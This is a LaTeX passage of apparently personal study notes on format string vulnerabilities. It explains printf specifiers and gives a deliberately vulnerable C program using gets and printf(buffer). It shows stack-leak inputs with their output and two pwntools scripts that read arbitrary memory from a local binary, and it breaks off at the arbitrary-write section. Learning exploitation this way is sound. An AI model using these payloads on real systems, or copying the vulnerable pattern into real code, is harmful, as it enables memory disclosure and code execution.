\subsection{Format string bug}
\url{https://axcheron.github.io/exploit-101-format-strings/}

\url{https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html}

\subsubsection{Introduction}
Format String is an  easily exploitable bug that can allow to perform powerful
actions such as reading from and writing to arbitrary memory locations.

Format strings provide a generic solution that allows a string to be output
that includes the values of variables, formatted precisely as dictated by the
programmer.
\begin{verbatim}
printf( “£%.2f\n", AmountInSterling );
\end{verbatim}
The first parameter to this function is the format string that specifies a
constant string with placeholders that specify where variables are to be
substituted into the string.

Interesting placeholders:
\begin{itemize}
    \item \verb+%p+: pointer
    \item \verb+%x$p+: pointer + offsert (\verb+x+)
    \item \verb+%s+: string
    \item \verb+%d+: int
    \item \verb+%x+: hex
\end{itemize}

A format string bug occurs when user-supplied data is included in the format
specification string of one of the \verb+printf+ family of functions and any
similar functions on your platform that accept a string that can contain
C-style format specifiers, such as the \verb+wprintf+ functions on the Windows
platforms.

The attacker supplies a number of format specifiers that have no corresponding
arguments on the stack, and values from the stack are used in their place. This
leads to information disclosure and potentially the execution of arbitrary
code.

The key is that \verb+printf+ expects as many parameters as format string
specifiers, and in 32-bit it grabs these parameters from the stack. It will
naively print  the $n$ next value on the stack. 

\begin{verbatim}
#include <stdio.h>

int main(void) {
    char buffer[30];

    gets(buffer);

    printf(buffer);
    return 0;
}
\end{verbatim}

When facing the previous code, we can use \verb+buffer+ to leak the stack by
providing the format string (for example \verb+%x %x %x %x+)


\subsubsection{Arbitrary Reads}

One important thing to understand is that in x86 the format string is itself
stored on the stack.  so providing an input like
\verb+AAAAAAAAAAAAAAAAAAA%x%x...SNIP...%x%x+ should at one point display
\verb+41414141414141+

we can the according to the printed value simplify it by
\verb+AAAA%n$p+:

\begin{verbatim}
$ ./vuln
AAAA%x%x%x%x%x%x%x%x%x
AAAAf7d845248048288804918cf63d4e2ef7fbe3e041414141782578257825782578257825
$ ./vuln
AAAA%6$x
AAAA41414141
\end{verbatim}

So this means we can pass an arbitrary value as an argument to \verb+printf+. 

So now if the arbitrary value is and address then we can use a \verb+%s+
placeholder to print the data at that address. Not that data will be printed
until the first NULL byte.

let's try with the base address of the binary (\verb+vmmap+ in gdb). Let say we
obtain \verb+0x8048000+: 
\begin{verbatim}
from pwn import *

p = process('./vuln')

payload = p32(0x8048000)
payload += b'|%6$s'

p.sendline(payload)
log.info(p.clean())
\end{verbatim}

If we try to inject \verb+0x8048000%n$s+ it will not
work since the tring stored in the buffer will start with a NULL byte.

so the payload must be like this \verb+%n$s0x8048000+ but there might be
another problem in data alignment.

first since we put the placeholder first the offset must be shifted according
to the size of the offset. As address are 4 bytes we must obtain a prefix that
is a multiple of 4. In our example it is fine since \verb+%6$x+ is 4 bytes the
with adjustement it will become \verb+%7$x+. but
if the $n$ was let say 14 then we must introduce dummy caracter to obtain a
muslitple of 4 (\verb+%14$x,,,+) t 

\begin{verbatim}
from pwn import *

p = process('./vuln')

payload = b'%8$p||||'
payload += p32(0x8048000)

p.sendline(payload)
log.info(p.clean())
\end{verbatim}

\subsubsection{Arbitrary Write}

The \verb+%n+ placehoder take a pointer and wrties there {\emph the number of
characters written so far}.





